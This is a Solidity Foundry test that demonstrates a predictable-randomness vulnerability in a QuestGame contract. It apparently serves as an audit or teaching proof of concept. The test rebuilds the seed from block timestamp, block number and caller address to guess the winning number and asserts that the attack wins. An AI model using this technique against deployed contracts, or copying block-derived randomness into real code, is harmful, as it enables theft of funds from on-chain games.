
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {QuestGame} from "../src/QuestGame.sol";

contract TestWeakRandomnessQuestGame is Test {
    QuestGame public game;

    function setUp() public {
        vm.deal(address(this), 100 ether);
        game = new QuestGame{value: 10 ether}();
    }

    function test_highlightPredictableRandomValue(uint256 blockTimestamp, uint256 blockNumber) public {
        vm.assume(blockTimestamp >= block.timestamp);
        vm.assume(blockNumber >= block.number);
        vm.assume(blockTimestamp > 0);
        vm.assume(blockNumber > 0);

        vm.warp(blockTimestamp);
        vm.roll(blockNumber);

        uint256 seed = uint256(
            keccak256(
                abi.encodePacked(
                    block.timestamp,
                    block.number,
                    address(this)
                )
            )
        );
        uint256 expectedNumber = seed % 100;

        vm.deal(address(this), address(this).balance + QuestGame.ENTRY_FEE());

        game.attemptQuest{value: QuestGame.ENTRY_FEE()}(expectedNumber);

        (uint256 exp, uint256 wins) = game.getPlayerStats(address(this));
        assertEq(wins, 1, "Attack should win predictably");
        assertEq(exp, 100, "Experience should increase on predictable win");
    }
}
